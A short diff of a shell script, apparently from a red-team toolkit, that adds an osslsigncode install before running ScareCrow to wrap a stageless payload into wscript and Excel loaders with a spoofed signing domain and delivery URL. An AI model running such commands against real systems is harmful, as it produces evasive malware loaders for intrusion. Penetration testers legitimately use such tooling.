@@ -190,6 +190,8 @@ read domain
 echo "[+] Please enter url of domain being used for Assessment (e.g https://google.com)"
 read url
        #Create ScareCrow Payloads
+       echo "[+] Installing OSSLSigncode"
+       sudo apt-get install osslsigncode
        echo "[+] $payload64stageless found, Generating ScaryWscript ScaryExcel and ScaryMSIEXEC"
        /tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless  -Loader wscript -url $url -domain $domain -O $payload_dir/01-scarywscript.js	
        /tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless -Loader excel -url $url -domain $domain -O $payload_dir/02-scaryexcel.js 
